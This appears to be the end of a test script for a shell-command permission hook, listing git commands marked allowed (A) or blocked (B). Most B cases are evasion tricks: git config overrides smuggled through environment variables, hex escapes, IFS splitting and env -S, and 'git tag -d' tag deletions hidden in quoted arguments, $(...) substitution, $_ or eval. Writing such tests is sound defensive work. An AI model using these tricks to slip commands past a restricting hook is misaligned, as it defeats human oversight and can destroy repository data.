B	GIT_CONFIG_KEY_0=pull.ff$E GIT_CONFIG_COUNT=1 GIT_CONFIG_VALUE_0=false git pull
B	GIT_CONFIG_KEY_0=pull.ff${E} GIT_CONFIG_COUNT=1 GIT_CONFIG_VALUE_0=false git pull
B	GIT_CONFIG_KEY_0=pull.ff; export GIT_CONFIG_KEY_0
B	GIT_CONFIG_KEY_0=$'pull.f\\x66' GIT_CONFIG_COUNT=1 GIT_CONFIG_VALUE_0=false git pull
B	GIT_CONFIG_PARAMETERS="'pull.ff'='false'" git pull
B	GIT_CONFIG_PARAMETERS="'pull.ff=false'" git pull
B	env -S'GIT_CONFIG_KEY_0=pull.ff\\tGIT_CONFIG_COUNT=1 git pull'
B	GIT_CONFIG_KEY_0=aliasx.y GIT_CONFIG_KEY_1=alias.x GIT_CONFIG_VALUE_1=stash git x
# a single-quoted argument of git tag that is not an option or a value is a name or a pattern
A	git tag -l 'v -di'
A	git tag --list 'v -d x'
A	git -C . tag -l 'v -d'
A	git tag -l ' -d'
B	git tag -l 'v -di' -d v1
B	git tag 'v x' -di
B	git tag '-di' v1
B	git tag -'d' v1
B	git tag -d 'v -l'
B	git tag -l 'v -di'; git tag -d v1
B	git tag -l 'v -di'; git tag -di v1
B	git tag -l 'v'" -di" -di v1
B	git tag -l 'v $(git tag -di v1)' $(git tag -di v1)
B	set -k; git tag -u X=1 'k' -di v1
# the shell or env can cut the key's end off, or run the argument again
B	v=GIT_CONFIG_KEY_0=pull.rebaseX; GIT_CONFIG_COUNT=1 GIT_CONFIG_VALUE_0=true env "${v%X}" git pull
B	IFS=Z; v=GIT_CONFIG_COUNT=1ZGIT_CONFIG_KEY_0=pull.rebaseZGIT_CONFIG_VALUE_0=trueZgitZpull; env $v
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_VALUE_0=true GIT_CONFIG_KEY_0=$(tr<<<pull.rebaseX -d X) git pull
B	: $((1<<2)); GIT_CONFIG_COUNT=1 GIT_CONFIG_VALUE_0=true env -S GIT_CONFIG_KEY_0=pull.r\\ebase\\\\c git pull
B	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=pull.ffx GIT_CONFIG_KEY_1=pull.ff GIT_CONFIG_VALUE_1=false git pull
B	GIT_CONFIG_KEY_0=pull.ffx\ngit status
B	xargs -a f -I X env GIT_CONFIG_PARAMETERS=Xpull.ffX git pull
B	xargs -a f -I X env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=pull.ffX GIT_CONFIG_VALUE_0=false git pull
B	GIT_CONFIG_PARAMETERS=pull.ffx git pull
B	git tag -l 'git tag -di v1'; $_
B	git tag -l 'v1 -di'; git tag $_
B	git tag -l 'git tag -di v1'; eval "$_"
B	git tag -l 'git tag -di v1'\n$_
B	git tag -l 'git tag -di v1' && echo ok
CASES

printf 'pass=%d fail=%d (%s)\n' "${pass}" "${fail}" "${HOOK}"
[[ "${fail}" -eq 0 ]]
